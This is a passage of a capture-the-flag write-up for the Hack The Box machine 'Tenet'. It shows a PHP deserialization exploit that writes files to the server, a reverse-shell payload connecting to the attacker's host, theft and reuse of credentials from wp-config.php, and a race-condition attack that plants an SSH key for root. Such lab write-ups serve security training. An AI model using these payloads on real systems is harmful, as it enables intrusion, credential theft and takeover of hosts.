</span></span><span class="line"><span class="cl">O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D
</span></span></code></pre></div><p>I&rsquo;ll send that output to <code>sator.php</code> via <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ curl -sI <span class="s2">&#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D&#34;</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 12:43:43 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span></code></pre></div><p>When I visit <code>10.10.10.223/test.php</code>, it returns the PHP info page, which means I have a code execution.</p>
<p><div class="img-container"><img src="imgs/image-20210614194451145.png" alt="image-20210614194451145"  /></div>
</p>
<p>Based on 0xdf&rsquo;s awesome <a href="https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#create-serialized-object">writeup</a>,  this payload would also works:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DatabaseExport</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="nx">user_file</span> <span class="o">=</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="nx">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h4 id="insecure-deserialization-attack---weaponize">Insecure Deserialization attack - Weaponize</h4>
<p>This time, I&rsquo;ll modify the file name and the data for reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DatabaseExport</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">        		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_file</span> <span class="o">=</span> <span class="s1">&#39;iamf.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php system(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/443 0&gt;&amp;1&#39; </span><span class="se">\&#34;</span><span class="s2">) ?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>I&rsquo;ll script the exploitation step and then wait on my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">serial</span><span class="o">=</span><span class="sb">`</span>php tenetization.php<span class="sb">`</span>
</span></span><span class="line"><span class="cl">curl -s http://10.10.10.223/sator.php?arepo<span class="o">=</span><span class="nv">$serial</span>
</span></span><span class="line"><span class="cl">sleep 5<span class="p">;</span>
</span></span><span class="line"><span class="cl">curl -s http://10.10.10.223/iamf.php
</span></span></code></pre></div><p>When I run the exploit, it hangs.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ bash tenetization.sh
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Grabbing users from text file &lt;br&gt;
</span></span><span class="line"><span class="cl"><span class="o">[]</span> Database updated &lt;br&gt;<span class="o">[]</span> Database updated &lt;br&gt;
</span></span></code></pre></div><p>But after a few seconds, I have a shell on my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «~» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">443</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.223<span class="o">]</span> <span class="m">39174</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1545<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@tenet:/var/www/html$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">www-data@tenet:/var/www/html$
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614195508219.png" alt="image-20210614195508219"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-neil">Shell as neil</h3>
<h4 id="wp-config">WP config</h4>
<p>Inside the <code>wp-config.php</code> file, there is a database credential.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
</span></span><span class="line"><span class="cl">cat wp-config.php
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;wordpress&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database username */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;neil&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database password */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;Opera2112&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="ssh---neil">SSH - Neil</h4>
<p>The credentials works on SSH (<code>neil:Opera2112</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ ssh neil@10.10.10.223
</span></span><span class="line"><span class="cl">neil@10.10.10.223<span class="err">&#39;</span>s password:
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Mon Jun <span class="m">14</span> 12:57:27 <span class="m">2021</span> from 10.10.16.12
</span></span><span class="line"><span class="cl">neil@tenet:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span>
</span></span></code></pre></div><p>User&rsquo;s flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> neil neil <span class="m">33</span> Jun <span class="m">14</span> 06:46 user.txt
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614200613572.png" alt="image-20210614200613572"  /></div>
</p>
<hr>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo-privileges">Sudo privileges</h4>
<p>User neil has sudo privileges on a custom script called <code>enableSSH.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> neil on tenet:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User neil may run the following commands on tenet:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
</span></span><span class="line"><span class="cl">neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">1080</span> Dec  <span class="m">8</span>  <span class="m">2020</span> /usr/local/bin/enableSSH.sh
</span></span></code></pre></div><h4 id="script-analysis">Script analysis</h4>
<p>The following is the contents of <code>enableSSH.sh</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">checkAdded<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">sshName</span><span class="o">=</span><span class="k">$(</span>/bin/echo <span class="nv">$key</span> <span class="p">|</span> /usr/bin/cut -d <span class="s2">&#34; &#34;</span> -f 3<span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> ! -z <span class="k">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                /bin/echo <span class="s2">&#34;Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                /bin/echo <span class="s2">&#34;Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">checkFile<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> ! -s <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> ! -f <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                /bin/echo <span class="s2">&#34;Error in creating key file!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">[[</span> -f <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">addKey<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">tmpName</span><span class="o">=</span><span class="k">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">(</span><span class="nb">umask</span> 110<span class="p">;</span> touch <span class="nv">$tmpName</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /bin/echo <span class="nv">$key</span> &gt;&gt;<span class="nv">$tmpName</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        checkFile <span class="nv">$tmpName</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /bin/cat <span class="nv">$tmpName</span> &gt;&gt;/root/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /bin/rm <span class="nv">$tmpName</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">key</span><span class="o">=</span><span class="s2">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
</span></span><span class="line"><span class="cl">addKey
</span></span><span class="line"><span class="cl">checkAdded
</span></span></code></pre></div><p>The contents of the <code>$key</code> variable will be saved to a temporary file at <code>/tmp/SSH-randomfilename</code> before being added to the <code>/root/.ssh/authorized_keys</code> file by the <code>addKey()</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ <span class="nv">tmpName</span><span class="o">=</span><span class="k">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="k">)</span>
</span></span><span class="line"><span class="cl">neil@tenet:~$ <span class="nb">echo</span> <span class="nv">$tmpName</span>
</span></span><span class="line"><span class="cl">/tmp/ssh-4swbpcnN
</span></span></code></pre></div><p>Then the  <code>checkAdded()</code> function will take the  <code>username@hostname</code> part from the value of <code>$key</code> which is <code>root@ubuntu</code> and check if it already exist in <code>/root/.ssh/authorized_keys</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="o">[[</span> ! -z <span class="k">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">                /bin/echo <span class="s2">&#34;Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">                /bin/echo <span class="s2">&#34;Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>The idea here is if I could overwrite the file contents of <code>/tmp/ssh-randomfilename</code> with my own public key then I should be able to log in as root using my private key. So, it&rsquo;s a race condition.</p>
<h4 id="exploiting-enablesshsh">Exploiting enableSSH.sh</h4>
<p>Just like how I did earlier on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/#exploiting-scanloserssh">ScriptKiddie</a>, I&rsquo;ll also use while loop to keep inserting my public key at <code>/tmp/ssh-*</code>, but this time, I&rsquo;ll use a binary called <code>tee</code>.</p>
<p>First, I&rsquo;ll put my public key at Neil&rsquo;s home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@iamf&#39;</span> &gt; .iamf
</span></span></code></pre></div><p>And Then I&rsquo;ll run this loop to keep user <code>neil</code> executing sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> sudo /usr/local/bin/enableSSH.sh<span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</span></span></code></pre></div><p>I&rsquo;ll open another neil&rsquo;s session and run this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ <span class="k">while</span> sleep 0.1<span class="p">;</span> <span class="k">do</span> cat .iamf <span class="p">|</span> tee /tmp/ssh-*<span class="p">;</span><span class="k">done</span>
</span></span></code></pre></div><p>On my Kali, I will do SSH login in loop.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> ssh -oConnectTimeout<span class="o">=</span>1s -oPasswordAuthentication<span class="o">=</span>no root@10.10.10.223 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></div><p>After some minutes, I can finally login as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ ssh root@10.10.10.223
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Tue Jun <span class="m">15</span> 09:50:37 <span class="m">2021</span> from 10.10.14.53
</span></span><span class="line"><span class="cl">root@tenet:~# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210615165352952.png" alt="image-20210615165352952"  /></div>
</p>
<p>Root flag is done here.</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
